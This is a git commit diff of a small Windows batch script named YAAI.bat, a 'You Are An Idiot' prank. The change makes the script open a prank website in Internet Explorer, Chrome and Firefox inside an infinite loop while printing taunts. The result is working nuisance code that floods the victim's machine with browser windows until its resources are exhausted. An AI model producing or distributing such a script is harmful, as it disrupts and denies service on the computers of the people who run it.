6bcf24dd7f8daf35956d8362846cd34951d16fe2
Sebastian <46867564+seba0456@users.noreply.github.com>
2020-05-11 15:25:01 +0200

    V2
    -Program can run now Google Chrome and Firefox
    -Fixed bug

--- YAAI.bat
+++ YAAI.bat
@@ -1,6 +1,8 @@
 @echo off
 :GO
-start iexplore "http://www.youareanidiot.org/"
+start iexplore "https://piv.pivpiv.dk/"
+start chrome "https://piv.pivpiv.dk/"
+start firefox "https://piv.pivpiv.dk/"
 echo You Are AN idiot
 echo HAHAHAHAHA
 goto GO
